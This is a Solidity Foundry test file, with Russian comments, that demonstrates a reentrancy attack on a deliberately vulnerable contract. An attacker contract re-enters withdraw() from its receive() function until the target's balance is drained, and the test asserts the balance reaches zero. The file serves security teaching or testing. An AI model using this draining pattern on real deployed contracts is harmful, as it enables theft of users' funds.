// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReentrancyVuln.sol";

contract ReentrancyTest is Test {
    ReentrancyVuln vulnerableContract;
    address payable attacker = payable(address(0xBEEF));

    function setUp() public {
        vulnerableContract = new ReentrancyVuln();
        vm.deal(attacker, 10 ether);
    }

    function testReentrancyAttack() public {
        vm.startPrank(attacker);
        payable(address(vulnerableContract)).transfer(2 ether); // ✅ Депозит в контракт
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(payable(address(vulnerableContract)));
        attackerContract.attack{value: 1 ether}();
        vm.stopPrank();

        assertEq(address(vulnerableContract).balance, 0, "Reentrancy attack failed");
    }
}

// Attack contract
contract ReentrancyAttacker {
    ReentrancyVuln target;

    constructor(address payable _target) {  // ✅ Делаем _target "payable"
        target = ReentrancyVuln(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
}
